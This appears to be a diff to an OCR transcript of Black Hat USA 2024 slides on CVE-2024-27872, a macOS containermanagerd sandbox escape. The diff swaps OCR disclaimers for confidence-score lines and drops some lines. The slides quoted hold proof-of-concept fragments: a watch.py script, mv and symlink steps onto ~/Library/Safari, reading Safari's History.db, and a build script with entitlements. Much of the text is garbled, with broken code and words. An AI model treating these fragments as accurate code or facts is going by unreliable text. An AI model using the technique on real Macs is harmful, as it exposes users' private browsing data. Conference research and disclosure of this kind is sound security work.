@@ -2424,11 +2250,10 @@ nLink: > 8", dataPath, LinkTarget) ;
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 CVE-2024-27872
 Apple has assigned CVE-2024-27872 to this issue. CVEs are unique IDs used
 to uniquely identify vulnerabilites. The following describes the impact and
@@ -2494,12 +2319,11 @@ ContainerManagerd prevents the launch of the malicious sandboxed app due to the 
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 bisek hat
-USA 2024
-GuluBadContainerManager3
 PoC Step
 watch.py
 subprocess
@@ -2507,9 +2331,7 @@ sys
 os
 nit
 command
-log', ‘stream’,
 f'process == “cont
-Log'
 style sys
 Open a subproces
 th subprocess.
@@ -2523,11 +2345,9 @@ os.
 ("Monitoring
 (bundle_identifier):
 predicate
-ainermanagerd"',
 to execute the command and stream the outpu
 (command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text
 ess the output line by line in real-time
-oc. stdout. 0
 result: count = 1, error =' line:
 (f"mv ~/Library/Containers/{bundle_identifier}/Data
 ("Exploit 1.")
@@ -2536,11 +2356,7 @@ line:
 result: count = 0, error ='
 (f"ln -s ~/Library/Safari
 ("Exploit done.")
-dev/null’
 ped by user.
-as e:
-(f"Unexpecte
-_—name__ —main__
 (sys.argv) 2
 bundle_identifier
 # print (bundle
@@ -2573,24 +2389,21 @@ _2. Register the sbpl_
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 black hat
-USA 2024
 rk Foundation -f
 encoding="UTF-8"?>
 <!DOCT Apple//DTD PLIST 1.0//EN" “http www. app Le. com/DTDs
 apple. se ty. app-sand ey
-apple. se ty y-exception. sbpl</key
 <string> file-read* file-write* (require-a vnode-type RE
 </array>
--/entitlements.plist
 UUID in t idleId
 ?xml ver i TF ?
 DOCTYPE plist P ~0//EN http ww e ym
 version=
-y>CFBundlel
 tring>con ger3. $uuid</stri
 <key>CFBundle
 <string>main</s >
@@ -2598,10 +2411,8 @@ tring>con ger3. $uuid</stri
 tring>10.13< ing>
 main.app
 main.app/Contents/Mac0S/
-./main.app/Contents/Info. plist]
 Li entitlements ./entitlements.plist main.app
 watch.py com.example.badcontainermanager3. $uuid
-»/main.app
 3
 output
 $( /Library/Safari 2>&1)
@@ -2609,12 +2420,9 @@ output
 Failed, try again.
 10
 /Library/Containers/com. example. badcontainermanager3.$uuid/Data
-p ~/Library/Containers/com. example. badcontainermanager3. $uuid/Data
-«/main.app
 Success. Now we can access rary/Safari. Of course, we can a
 Check /tmp, you will find History.db of Safari.
 Check brary/Safari, you w find a file name YOUHAVEBEENHACK
-)
 Pre
 ertyList
 york Cocoa main.m —o main.app/Contents/MacOS/main
@@ -2626,23 +2434,20 @@ ages
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Date Modified Date Modified
 ScreenRecordings 4
 Application Scripts
-openvpn-connect-postinstall-1709000701.log
-openvpn-connect-preinstall-1709000697.log
 studentd © com.apple.launchd.QNkeQoA6lB
-Autosave Information  powerlog
+Autosave Information powerlog
 Keychains
-Homekit
 HTTPStorages
 Translation
 Cookies
 LaunchAgents
-(& IdentityServices
 Saved Application State
 DataDeliveryServices
 Assistant
@@ -2793,12 +2598,12 @@ Arbitrary Files Read and Write
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @ QuickTime Player File Edit View Window Help Q S&S MondJul8 18:52
 »~. tmp — 80x24
-ae he Fecal l= ~~ aan © G \sh-3.2$ sw_vers ;csrutil status
 ProductName: macOS
 Name “| Date Modified Size Kind ProductVersion: 15.0
 > 9) AdhocSignatureCache May 20, 2024 at 13:36 -- Folder Syckon arcu: . p 24A5279h bled
